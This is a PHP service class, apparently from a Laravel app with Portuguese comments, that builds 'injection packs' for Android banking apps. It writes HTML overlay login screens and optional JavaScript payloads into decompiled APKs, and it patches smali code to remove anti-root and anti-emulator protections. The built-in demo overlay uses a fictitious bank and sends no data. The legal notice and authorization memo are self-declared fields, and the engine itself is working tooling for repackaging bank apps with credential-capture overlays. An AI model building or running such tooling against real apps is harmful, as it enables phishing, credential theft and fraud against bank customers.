<?php

namespace App\Services;

use App\Models\BankInject;
use ZipArchive;

/**
 * Fase 3 — Pacote de injeção em MODO LABORATÓRIO AUDITÁVEL.
 *
 * O que este serviço faz (de verdade):
 *  1. Empacota overlay HTML + JS + pares de patch smali em um ZIP auditável
 *     (buildPack) com config.json e aviso legal embutidos;
 *  2. Aplica o overlay como asset em um diretório já decodificado pelo
 *     apktool (assets/vault_inject_overlay.html) e executa pares localizados
 *     de busca/substituição (protection_patches) com limite e relatório —
 *     nunca lança exceção fatal (tudo é logado no relatório).
 *
 * Limites honestos (lidos do INJECT_SPEC do controller):
 *  - Remoção de proteções anti-root/emulador é por-alvo (smali específico de
 *    cada app). O motor aqui é GENÉRICO: aplica os pares que o analista
 *    cadastrou para aquele alvo e relata o que casou ou não. Sem pares
 *    cadastrados, nada é alterado além do asset de overlay.
 *  - O overlay demo embutido usa um BANCO FICTÍCIO ("Banco Vault de Teste")
 *    com marca d'água de TESTE. Nunca gere overlay com marca de banco real
 *    sem autorização expressa do titular (ver LEGAL_NOTICE + gate de
 *    terms_accepted/auth_memo no controller).
 */
class BankInjectService
{
    public const MAX_PAIRS = 20;

    public const LEGAL_NOTICE = 'AVISO LEGAL / USO AUTORIZADO APENAS: este pacote destina-se exclusivamente a '
        . 'testes de segurança autorizados pelo titular do aplicativo/conta, com finalidade de auditoria, '
        . 'pesquisa ou conscientização, em ambiente controlado. Interceptar credenciais, remover proteções ou '
        . 'distribuir APKs modificados sem autorização pode configurar crime (ex.: art. 154-A do Código Penal, '
        . 'Lei 12.737/2012) e violações à LGPD/Marco Civil. O operador declara possuir autorização (auth_memo) '
        . 'e assume integral responsabilidade pelo uso. APKs re-assinados perdem o selo original e são '
        . 'sinalizados pelo Play Protect como de origem desconhecida.';

    /**
     * Monta o ZIP do pacote de injeção em storage/app/tmp e retorna o caminho.
     */
    public static function buildPack(BankInject $inject): string
    {
        $tmpDir = storage_path('app/tmp');
        if (!is_dir($tmpDir)) {
            mkdir($tmpDir, 0755, true);
        }

        $zipPath = $tmpDir . '/inject_pack_' . $inject->id . '_' . uniqid() . '.zip';
        $overlay = $inject->overlay_html ?: static::demoOverlay();

        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            throw new \RuntimeException('Não foi possível criar o ZIP do pacote de injeção.');
        }

        $zip->addFromString('overlay.html', $overlay);
        if (!empty($inject->js_payload)) {
            $zip->addFromString('payload.js', $inject->js_payload);
        }
        $zip->addFromString('config.json', json_encode([
            'inject_id' => $inject->id,
            'bank_name' => $inject->bank_name,
            'target_bank' => $inject->target_bank,
            'inject_type' => $inject->inject_type,
            'spec' => \App\Http\Controllers\BankInjectController::INJECT_SPEC,
            'has_js_payload' => !empty($inject->js_payload),
            'protection_pairs' => count(static::parsePairs($inject->protection_patches)),
            'terms_accepted' => (bool) $inject->terms_accepted,
            'auth_memo' => $inject->auth_memo,
            'gerado_em' => now()->toISOString(),
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        $zip->addFromString('README_LEGAL.txt', static::LEGAL_NOTICE . "\n\nauth_memo: " . ($inject->auth_memo ?? '-') . "\n");
        $zip->close();

        return $zipPath;
    }

    /**
     * Aplica o overlay + pares de proteção em diretório decodificado.
     * Retorna relatório [{acao, detalhe, ok}]. Nunca falha fatal.
     */
    public static function applyToDecompiled(string $decompiledDir, BankInject $inject): array
    {
        $report = [];

        // 1) Overlay como asset (não altera smali; WebView de teste pode
        //    carregar file:///android_asset/vault_inject_overlay.html)
        try {
            $assetsDir = rtrim($decompiledDir, '/') . '/assets';
            if (!is_dir($assetsDir)) {
                mkdir($assetsDir, 0755, true);
            }
            $overlay = $inject->overlay_html ?: static::demoOverlay();
            file_put_contents($assetsDir . '/vault_inject_overlay.html', $overlay);
            $report[] = [
                'acao' => 'overlay_asset',
                'detalhe' => 'assets/vault_inject_overlay.html gravado (' . strlen($overlay) . ' bytes, banco: ' . ($inject->target_bank ?? $inject->bank_name) . ')',
                'ok' => true,
            ];
        } catch (\Throwable $e) {
            $report[] = ['acao' => 'overlay_asset', 'detalhe' => 'falha: ' . $e->getMessage(), 'ok' => false];
        }

        // 2) Pares de proteção (root/emulador): busca/substituição localizada.
        $pairs = static::parsePairs($inject->protection_patches);
        if (empty($pairs)) {
            $report[] = [
                'acao' => 'protection_patches',
                'detalhe' => 'nenhum par cadastrado — manifest/smali preservados (proteções do alvo NÃO foram tocadas)',
                'ok' => true,
            ];
            return $report;
        }

        foreach ($pairs as $i => $pair) {
            $file = $pair['file'] ?? null;
            $search = $pair['search'] ?? null;
            $replace = $pair['replace'] ?? null;
            if (!$file || $search === null || $replace === null) {
                $report[] = ['acao' => "pair#{$i}", 'detalhe' => 'par incompleto (file/search/replace) — ignorado', 'ok' => false];
                continue;
            }
            $matches = glob(rtrim($decompiledDir, '/') . '/' . ltrim($file, '/')) ?: [];
            if (empty($matches)) {
                $report[] = ['acao' => "pair#{$i}", 'detalhe' => "arquivo não encontrado no alvo: {$file}", 'ok' => false];
                continue;
            }
            $applied = 0;
            foreach ($matches as $path) {
                if (!is_file($path)) {
                    continue;
                }
                $content = @file_get_contents($path);
                if ($content === false || strpos($content, $search) === false) {
                    continue;
                }
                $new = str_replace($search, $replace, $content, $count);
                if ($count > 0) {
                    @file_put_contents($path, $new);
                    $applied += $count;
                }
            }
            $report[] = [
                'acao' => "pair#{$i}",
                'detalhe' => $applied > 0
                    ? "aplicado {$applied}x em " . count($matches) . " arquivo(s) [{$file}]"
                    : "padrão não encontrado em " . count($matches) . " arquivo(s) [{$file}] — alvo preservado",
                'ok' => $applied > 0,
            ];
        }

        return $report;
    }

    /**
     * Decodifica protection_patches (JSON) com limite de segurança.
     * @return array<int, array{file?: string, search?: string, replace?: string}>
     */
    public static function parsePairs($raw): array
    {
        if (empty($raw)) {
            return [];
        }
        if (is_array($raw)) {
            $decoded = $raw;
        } else {
            $decoded = json_decode((string) $raw, true);
        }
        if (!is_array($decoded)) {
            return [];
        }
        // Aceita lista ou {"pairs": [...]}
        if (isset($decoded['pairs']) && is_array($decoded['pairs'])) {
            $decoded = $decoded['pairs'];
        }
        return array_slice(array_values(array_filter($decoded, 'is_array')), 0, static::MAX_PAIRS);
    }

    /**
     * Overlay DEMO com BANCO FICTÍCIO e marca de TESTE.
     * O JS apenas preenche demonstração local — sem exfiltração.
     */
    public static function demoOverlay(): string
    {
        return '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8">'
            . '<meta name="viewport" content="width=device-width,initial-scale=1">'
            . '<title>Banco Vault de Teste — Ambiente de Auditoria</title>'
            . '<style>body{font-family:system-ui,sans-serif;background:#0b1120;color:#f8fafc;margin:0;padding:2rem;box-sizing:border-box}'
            . '.watermark{position:fixed;top:8px;right:8px;background:#f59e0b;color:#000;font-weight:700;font-size:12px;padding:4px 10px;border-radius:8px}'
            . '.card{max-width:420px;margin:4vh auto;background:#111c34;border:1px solid #38bdf8;border-radius:16px;padding:2rem}'
            . 'h1{font-size:1.2rem;margin:0 0 .25rem}.sub{color:#94a3b8;font-size:.85rem;margin-bottom:1.5rem}'
            . 'input{width:100%;padding:.9rem;border-radius:10px;border:1px solid #334155;background:#0b1120;color:#fff;margin-bottom:1rem;box-sizing:border-box}'
            . 'button{width:100%;padding:1rem;border-radius:10px;border:none;background:#38bdf8;color:#001;font-weight:700;cursor:pointer}'
            . '#msg{margin-top:1rem;font-size:.8rem;color:#94a3b8;min-height:1.2em}</style></head><body>'
            . '<div class="watermark">AMBIENTE DE TESTE — BANCO FICTÍCIO</div>'
            . '<div class="card"><h1>Banco Vault de Teste</h1>'
            . '<p class="sub">Tela de demonstração para auditoria autorizada. Nenhum dado sai deste aparelho.</p>'
            . '<input id="u" placeholder="Usuário de teste" autocomplete="off">'
            . '<input id="p" type="password" placeholder="Senha de teste" autocomplete="off">'
            . '<button onclick="demo()">Entrar (demonstração)</button><p id="msg"></p></div>'
            . '<script>function demo(){document.getElementById("msg").textContent="Demonstração local: nada foi enviado. (Vault Lab)";}</script>'
            . '</body></html>';
    }
}
